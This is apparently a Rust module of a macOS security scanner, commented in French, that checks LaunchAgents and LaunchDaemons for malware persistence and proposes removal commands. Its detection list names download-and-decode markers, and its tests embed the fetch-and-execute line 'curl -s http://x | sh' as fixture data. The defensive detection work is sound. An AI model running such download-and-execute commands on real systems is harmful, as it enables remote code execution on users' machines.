//! Persistance sous macOS : ce qui se relance tout seul (LaunchAgents de l'utilisateur et du système,
//! LaunchDaemons). C'est le moyen favori des logiciels malveillants pour Mac (Adload, Shlayer, Atomic Stealer…).

use std::path::{Path, PathBuf};

use super::super::{Constat, alerte, ok};
use crate::plist::Valeur;
use crate::risk::Niveau;
use crate::{tr, trf};

const CAT: &str = "Persistance";

/// Ce qu'un .plist de launchd lance.
enum Lancement {
    Programme(String, String),
    /// Fichier fabriqué pour gêner l'analyse (références qui multiplient les copies, bornes dépassées, taille
    /// démesurée) : jamais relu ni confié à plutil, qui développerait tout sans limite ; montré tel quel.
    Hostile,
    /// Absent, interdit, pas un fichier ordinaire (tube nommé), ou sans programme : sauté.
    Rien,
}

/// Programme lancé par un .plist de launchd, et ses arguments. Le fichier est lu directement ; plutil ne sert qu'en
/// secours, pour un format que le lecteur ne connaît pas, jamais pour un fichier refusé par ses bornes.
fn programme(plist: &Path) -> Lancement {
    let Ok(lu) = crate::plist::lire_fichier(plist) else {
        return Lancement::Rien;
    };
    let reglages = match lu {
        crate::plist::Lu::Plist(r) => r,
        crate::plist::Lu::TropGros | crate::plist::Lu::Hostile => return Lancement::Hostile,
        crate::plist::Lu::Inconnu => {
            let secours = crate::commande::lancer(
                std::process::Command::new("plutil")
                    .args(["-convert", "xml1", "-o", "-"])
                    .arg(plist),
                10,
            )
            .and_then(|r| crate::plist::lire(r.sortie.as_bytes()));
            let Some(r) = secours else {
                return Lancement::Rien;
            };
            r
        }
    };
    match lire_programme(&reglages) {
        Some((p, a)) => Lancement::Programme(p, a),
        None => Lancement::Rien,
    }
}

/// Program, ou à défaut le premier élément de ProgramArguments ; les arguments sont ceux de ProgramArguments après
/// le premier (launchd les passe aussi quand Program est donné, le premier faisant office de nom).
fn lire_programme(reglages: &Valeur) -> Option<(String, String)> {
    let elements: Vec<&str> = reglages
        .cle("ProgramArguments")
        .and_then(Valeur::tableau)
        .unwrap_or_default()
        .iter()
        .filter_map(Valeur::texte)
        .map(str::trim)
        .collect();
    let arguments = elements.get(1..).unwrap_or_default().join(" ");
    let programme = match reglages.cle("Program").and_then(Valeur::texte) {
        Some(p) => p.trim(),
        None => elements.first()?,
    };
    Some((programme.to_string(), arguments))
}

/// Ce qui rend un lancement suspect : dossier temporaire ou caché, script qui télécharge ou décode du code.
fn soupcon(programme: &str, arguments: &str) -> Option<&'static str> {
    let p = programme.to_lowercase();
    if [
        "/tmp/",
        "/private/tmp/",
        "/private/var/tmp/",
        "/users/shared/",
        "/downloads/",
    ]
    .iter()
    .any(|d| p.contains(d))
    {
        return Some(tr!(
            "lancé depuis un dossier temporaire ou partagé",
            "run from a temporary or shared folder"
        ));
    }
    if p.split('/')
        .any(|morceau| morceau.starts_with('.') && morceau.len() > 1)
    {
        return Some(tr!("lancé depuis un dossier caché", "run from a hidden folder"));
    }
    let interprete = [
        "/bash",
        "/sh",
        "/zsh",
        "/python",
        "/python3",
        "/osascript",
        "/perl",
        "/ruby",
    ]
    .iter()
    .any(|i| p.ends_with(i));
    let a = arguments.to_lowercase();
    if interprete
        && ["curl ", "base64", "| sh", "|sh", "eval ", "osascript -e"]
            .iter()
            .any(|m| a.contains(m))
    {
        return Some(tr!(
            "script qui télécharge ou décode du code au démarrage",
            "script that downloads or decodes code at startup"
        ));
    }
    None
}

pub fn persistance() -> Vec<Constat> {
    let maison = PathBuf::from(std::env::var_os("HOME").unwrap_or_default());
    let dossiers = [
        (maison.join("Library/LaunchAgents"), false),
        (PathBuf::from("/Library/LaunchAgents"), true),
        (PathBuf::from("/Library/LaunchDaemons"), true),
    ];
    let mut constats = Vec::new();
    let mut tiers = Vec::new();
    for (dossier, systeme) in dossiers {
        for f in std::fs::read_dir(&dossier).into_iter().flatten().flatten() {
            let chemin = f.path();
            if chemin.extension().is_none_or(|e| e != "plist") {
                continue;
            }
            // Le nom du fichier et le programme lancé sont choisis par qui a posé l'agent : montrés rendus
            // inoffensifs ; les commandes, elles, visent le vrai fichier.
            let nom = crate::ui::affichable(f.file_name().to_string_lossy().trim_end_matches(".plist"));
            // Les services d'Apple vivent dans /System : ceux-ci sont tous ajoutés par des programmes installés.
            let (prog, args) = match programme(&chemin) {
                Lancement::Programme(p, a) => (p, a),
                Lancement::Rien => continue,
                Lancement::Hostile => {
                    tiers.push(nom.clone());
                    constats.push(
                        alerte(
                            CAT,
                            Niveau::Eleve,
                            trf!(
                                "L'agent « {nom} » est un fichier fabriqué pour gêner l'analyse (références en boucle, copies multipliées ou taille démesurée) : aucun programme légitime n'écrit ça.",
                                "Agent “{nom}” is a file built to hinder analysis (looping references, multiplied copies or an outsized file): no legitimate program writes that."
                            ),
                        )
                        .manuel(
                            tr!(
                                "Regarde-le avec « plutil -p » dans le Terminal ; s'il ne vient d'aucun programme que tu connais, mets-le à la corbeille et redémarre",
                                "Look at it with “plutil -p” in Terminal; if it comes from no program you know, move it to the Trash and restart"
                            ),
                            &[],
                        ),
                    );
                    continue;
                }
            };
            tiers.push(nom.clone());
            let Some(raison) = soupcon(&prog, &args) else { continue };
            let prog = crate::ui::affichable(&prog);
            let plist = crate::commande::sh_chaine(&chemin.display().to_string());
            let (arret, retrait) = if systeme {
                (
                    format!("sudo launchctl bootout system {plist}"),
                    format!("sudo mv {plist} ~/.Trash/"),
                )
            } else {
                (
                    format!("launchctl bootout gui/$(id -u) {plist}"),
                    format!("mv {plist} ~/.Trash/"),
                )
            };
            constats.push(
                alerte(
                    CAT,
                    Niveau::Eleve,
                    trf!(
                        "« {nom} » se relance à chaque démarrage, {raison} : {prog}. C'est la marque habituelle des logiciels malveillants pour Mac.",
                        "“{nom}” restarts at every boot, {raison}: {prog}. This is the usual mark of Mac malware."
                    ),
                )
                .corriger(
                    trf!(
                        "Arrêter « {nom} » et mettre son fichier à la corbeille (récupérable)",
                        "Stop “{nom}” and move its file to the Trash (recoverable)"
                    ),
                    &[format!("{arret} 2>/dev/null; true"), retrait],
                ),
            );
        }
    }
    if constats.is_empty() {
        constats.push(if tiers.is_empty() {
            ok(
                CAT,
                tr!(
                    "Aucun programme tiers ne se relance au démarrage.",
                    "No third-party program restarts at boot."
                ),
            )
        } else {
            ok(
                CAT,
                trf!(
                    "{} programme(s) tiers se relancent au démarrage, rien de suspect : {}.",
                    "{} third-party program(s) restart at boot, nothing suspicious: {}.",
                    tiers.len(),
                    tiers.join(", ")
                ),
            )
        });
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lecture_des_plist() {
        let lire = |corps: &str| {
            let xml = format!("<?xml version=\"1.0\"?><plist version=\"1.0\"><dict>{corps}</dict></plist>");
            lire_programme(&crate::plist::lire(xml.as_bytes()).unwrap())
        };
        assert_eq!(
            lire(
                "<key>Label</key><string>com.ex.a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string>"
            ),
            Some(("/Applications/A.app/Contents/MacOS/a".into(), String::new()))
        );
        let args = "<key>ProgramArguments</key>\n<array>\n\t<string>/bin/bash</string>\n\t<string>-c</string>\n\t<string>curl -s http://x | sh</string>\n</array>";
        assert_eq!(
            lire(args),
            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
        );
        // Program et ProgramArguments ensemble : les arguments comptent aussi.
        let ensemble = format!("<key>Program</key><string>/bin/bash</string>{args}");
        assert_eq!(
            lire(&ensemble),
            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
        );
        assert_eq!(lire("<key>Label</key><string>com.ex.a</string>"), None);
    }

    #[test]
    fn programmes_suspects() {
        assert!(soupcon("/Users/a/Library/Application Support/.hidden/agent", "").is_some());
        assert!(soupcon("/private/tmp/x", "").is_some());
        assert!(soupcon("/bin/bash", "-c curl -s http://x | sh").is_some());
        assert!(soupcon("/Applications/Zoom.app/Contents/MacOS/zoom", "").is_none());
        assert!(soupcon("/Library/Application Support/Google/GoogleUpdater/launcher", "--wake").is_none());
    }
}
